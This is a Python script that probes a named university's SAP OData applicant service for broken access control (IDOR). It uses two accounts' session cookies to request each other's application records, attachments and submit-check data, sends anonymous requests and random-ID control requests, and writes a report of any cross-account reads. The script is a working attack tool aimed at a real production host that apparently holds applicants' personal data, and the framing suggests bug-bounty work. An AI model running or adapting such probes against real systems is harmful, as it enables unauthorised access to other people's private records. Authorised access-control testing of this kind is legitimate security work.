#!/usr/bin/env python3
"""Probe cross-account BAC/IDOR behavior for application-scoped OData endpoints."""

from __future__ import annotations

import argparse
import json
import os
import ssl
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen


DEFAULT_SERVICE_BASE = "https://webwsp.aps.kuleuven.be/sap/opu/odata/sap/ZC_AD_APPLICANT_SRV"
DEFAULT_ENV_FILE = ".env"


@dataclass
class HttpResult:
    status: int
    headers: dict[str, str]
    body: bytes
    error: str = ""

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "ignore")

    @property
    def content_type(self) -> str:
        return str(self.headers.get("Content-Type", ""))


def read_env(path: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    if not path.exists():
        return out
    for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        key = key.strip()
        value = value.strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        out[key] = value
    return out


def env_get(name: str, env_values: dict[str, str]) -> str:
    runtime = os.getenv(name, "").strip()
    if runtime:
        return runtime
    return env_values.get(name, "").strip()


def http_request(url: str, cookie: str, timeout: int = 12) -> HttpResult:
    headers = {"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}
    if cookie:
        headers["Cookie"] = cookie
    req = Request(url, headers=headers)
    ctx = ssl.create_default_context()
    try:
        with urlopen(req, timeout=timeout, context=ctx) as resp:
            return HttpResult(status=int(resp.status), headers={k: v for k, v in resp.headers.items()}, body=resp.read())
    except HTTPError as err:
        hdrs = {k: v for k, v in err.headers.items()} if err.headers else {}
        return HttpResult(status=int(err.code), headers=hdrs, body=err.read(), error=f"http_error_{err.code}")
    except URLError as err:
        return HttpResult(status=0, headers={}, body=str(err).encode("utf-8", "ignore"), error=f"url_error:{err}")
    except Exception as err:  # pragma: no cover
        return HttpResult(status=0, headers={}, body=str(err).encode("utf-8", "ignore"), error=f"unexpected:{err}")


def looks_like_login_page(result: HttpResult) -> bool:
    text = result.text.lower()
    if "text/html" not in result.content_type.lower() and "<html" not in text:
        return False
    signals = (
        "welcome to ku leuven association",
        "logon failed",
        "aanmelding mislukt",
        "idp.kuleuven.be",
        "saml2",
    )
    return any(sig in text for sig in signals)


def parse_payload(result: HttpResult) -> dict[str, Any] | list[Any] | None:
    try:
        return json.loads(result.text)
    except Exception:
        return None


def is_json(result: HttpResult, payload: Any | None = None) -> bool:
    if "json" in result.content_type.lower():
        return True
    if payload is None:
        payload = parse_payload(result)
    return isinstance(payload, (dict, list))


def extract_application_ids(payload: Any | None) -> list[str]:
    out: list[str] = []
    if not isinstance(payload, dict):
        return out
    data = payload.get("d")
    if isinstance(data, dict):
        one = data.get("applicationId")
        if isinstance(one, str) and one:
            out.append(one)
        results = data.get("results")
        if isinstance(results, list):
            for row in results:
                if isinstance(row, dict):
                    value = row.get("applicationId")
                    if isinstance(value, str) and value:
                        out.append(value)
    return out


def has_nonempty_data(payload: Any | None) -> bool:
    if not isinstance(payload, dict):
        return False
    data = payload.get("d")
    if isinstance(data, dict):
        if isinstance(data.get("results"), list):
            return len(data["results"]) > 0
        return len(data.keys()) > 0
    if isinstance(data, list):
        return len(data) > 0
    return False


def first_line(text: str, limit: int = 180) -> str:
    return " ".join(text.splitlines())[:limit]


def save_report(out_dir: Path, report: dict[str, Any]) -> tuple[Path, Path]:
    out_dir.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    json_path = out_dir / f"application_bac_probe_{stamp}.json"
    md_path = out_dir / f"application_bac_probe_{stamp}.md"
    json_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")

    lines: list[str] = []
    lines.append(f"# Application BAC Probe - {stamp}")
    lines.append("")
    lines.append(f"- service_base: `{report.get('service_base', '')}`")
    lines.append(f"- app_a: `{report.get('app_a', '')}`")
    lines.append(f"- app_b: `{report.get('app_b', '')}`")
    lines.append(f"- cookie_a_len: `{report.get('cookie_a_len', 0)}`")
    lines.append(f"- cookie_b_len: `{report.get('cookie_b_len', 0)}`")
    lines.append("")
    lines.append("## Requests")
    for row in report.get("rows", []):
        lines.append(
            f"- actor={row.get('actor')} relation={row.get('relation')} endpoint={row.get('endpoint')} "
            f"target_app={row.get('target_app')} status={row.get('status')} json={row.get('json')} "
            f"login_like={row.get('login_like')} nonempty={row.get('nonempty_data')} app_ids={row.get('application_ids')}"
        )
    lines.append("")
    lines.append("## Verdict")
    lines.append(f"- potential_cross_read_on_communication: `{report.get('potential_cross_read_on_communication', False)}`")
    lines.append(f"- potential_cross_read_on_applications_filter: `{report.get('potential_cross_read_on_applications_filter', False)}`")
    lines.append(f"- potential_cross_read_on_nav_collections: `{report.get('potential_cross_read_on_nav_collections', False)}`")
    lines.append(f"- communication_echo_behavior: `{report.get('communication_echo_behavior', False)}`")
    lines.append("")
    lines.append("## Communication Controls")
    for row in report.get("communication_controls", []):
        lines.append(
            f"- control_id={row.get('control_id')} status={row.get('status')} json={row.get('json')} "
            f"login_like={row.get('login_like')} app_ids={row.get('application_ids')} unread={row.get('unread_value')}"
        )
    lines.append("")
    lines.append(f"- notes: `{report.get('notes', '')}`")
    lines.append("")
    md_path.write_text("\n".join(lines), encoding="utf-8")
    return json_path, md_path


def build_urls(service_base: str, app_id: str) -> dict[str, str]:
    q_app = quote(app_id, safe="")
    return {
        "CommunicationSet": (
            f"{service_base}/CommunicationSet(applicationId='{q_app}',action='')"
            "?$format=json&sap-client=200"
        ),
        "ApplicationsByIdFilter": (
            f"{service_base}/Applications?$format=json&sap-client=200"
            f"&$filter=applicationId%20eq%20'{q_app}'"
        ),
        "ApplicationsEntityKey": f"{service_base}/Applications('{q_app}')?$format=json&sap-client=200",
        "SubmitChecksNav": f"{service_base}/Applications('{q_app}')/SubmitChecks?$format=json&sap-client=200",
        "AttachmentsNav": f"{service_base}/Applications('{q_app}')/Attachments?$format=json&sap-client=200",
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Probe application-scoped BAC/IDOR endpoints.")
    parser.add_argument("--service-base", default=DEFAULT_SERVICE_BASE)
    parser.add_argument("--env-file", default=DEFAULT_ENV_FILE)
    parser.add_argument("--app-a", required=True, help="Application ID from account A")
    parser.add_argument("--app-b", required=True, help="Application ID from account B")
    parser.add_argument("--out-dir", default="reports/research/manual_checks")
    args = parser.parse_args()

    env_values = read_env(Path(args.env_file))
    cookie_a = env_get("HUNTEROPS_USER_COOKIE", env_values)
    cookie_b = env_get("HUNTEROPS_USER_B_COOKIE", env_values)

    actors: dict[str, str] = {"A": cookie_a, "B": cookie_b, "ANON": ""}
    owner_by_app = {args.app_a: "A", args.app_b: "B"}
    urls_by_app = {args.app_a: build_urls(args.service_base, args.app_a), args.app_b: build_urls(args.service_base, args.app_b)}

    rows: list[dict[str, Any]] = []
    communication_controls: list[dict[str, Any]] = []
    potential_comm = False
    potential_filter = False
    potential_nav = False

    for actor, cookie in actors.items():
        for app_id, endpoints in urls_by_app.items():
            for endpoint_name, url in endpoints.items():
                resp = http_request(url, cookie=cookie)
                payload = parse_payload(resp)
                json_like = is_json(resp, payload)
                login_like = looks_like_login_page(resp)
                app_ids = extract_application_ids(payload)
                nonempty = has_nonempty_data(payload)
                relation = "unauthenticated"
                if actor in {"A", "B"}:
                    relation = "own_application" if owner_by_app.get(app_id) == actor else "cross_application"

                if relation == "cross_application" and resp.status == 200 and json_like and not login_like:
                    if endpoint_name == "CommunicationSet" and app_id in app_ids:
                        potential_comm = True
                    if endpoint_name == "ApplicationsByIdFilter" and app_id in app_ids:
                        potential_filter = True
                    if endpoint_name in {"SubmitChecksNav", "AttachmentsNav"} and nonempty:
                        potential_nav = True

                rows.append(
                    {
                        "actor": actor,
                        "relation": relation,
                        "target_app": app_id,
                        "endpoint": endpoint_name,
                        "url": url,
                        "status": resp.status,
                        "json": json_like,
                        "login_like": login_like,
                        "nonempty_data": nonempty,
                        "application_ids": app_ids,
                        "sample": first_line(resp.text),
                    }
                )

    # Control probes: if random IDs also return 200 and echo applicationId with zero unread,
    # CommunicationSet likely behaves like a permissive echo endpoint (low impact by itself).
    control_ids = ["000000000001", "999999999999", "abc"]
    echo_hits = 0
    for control_id in control_ids:
        control_url = (
            f"{args.service_base}/CommunicationSet(applicationId='{quote(control_id, safe='')}',action='')"
            "?$format=json&sap-client=200"
        )
        ctrl_resp = http_request(control_url, cookie=cookie_a)
        ctrl_payload = parse_payload(ctrl_resp)
        ctrl_ids = extract_application_ids(ctrl_payload)
        ctrl_json = is_json(ctrl_resp, ctrl_payload)
        ctrl_login = looks_like_login_page(ctrl_resp)
        unread_value = None
        if isinstance(ctrl_payload, dict):
            d_obj = ctrl_payload.get("d")
            if isinstance(d_obj, dict):
                unread_value = d_obj.get("nrUnreadMessages")
        if (
            ctrl_resp.status == 200
            and ctrl_json
            and not ctrl_login
            and control_id in ctrl_ids
            and unread_value in {0, "0"}
        ):
            echo_hits += 1
        communication_controls.append(
            {
                "control_id": control_id,
                "status": ctrl_resp.status,
                "json": ctrl_json,
                "login_like": ctrl_login,
                "application_ids": ctrl_ids,
                "unread_value": unread_value,
                "sample": first_line(ctrl_resp.text),
            }
        )

    communication_echo_behavior = echo_hits == len(control_ids)

    notes = "No cross-account signal in tested endpoints."
    if potential_comm and communication_echo_behavior:
        notes = (
            "CommunicationSet accepts arbitrary IDs (echo behavior) and may be low impact unless non-zero "
            "message counts or additional data can be demonstrated."
        )
    elif potential_comm:
        notes = "Cross-account read accepted on CommunicationSet by applicationId."
    if potential_filter:
        notes = "Cross-account read accepted on Applications filtered by applicationId."
    if potential_nav:
        notes = "Cross-account non-empty navigation data accepted by applicationId."

    report = {
        "service_base": args.service_base,
        "app_a": args.app_a,
        "app_b": args.app_b,
        "cookie_a_len": len(cookie_a),
        "cookie_b_len": len(cookie_b),
        "rows": rows,
        "potential_cross_read_on_communication": potential_comm,
        "potential_cross_read_on_applications_filter": potential_filter,
        "potential_cross_read_on_nav_collections": potential_nav,
        "communication_echo_behavior": communication_echo_behavior,
        "communication_controls": communication_controls,
        "notes": notes,
    }
    json_path, md_path = save_report(Path(args.out_dir), report)
    print("application_bac_probe_completed")
    print(f"report_json={json_path}")
    print(f"report_md={md_path}")
    print(f"potential_cross_read_on_communication={potential_comm}")
    print(f"potential_cross_read_on_applications_filter={potential_filter}")
    print(f"potential_cross_read_on_nav_collections={potential_nav}")
    print(f"communication_echo_behavior={communication_echo_behavior}")
    print(f"notes={notes}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
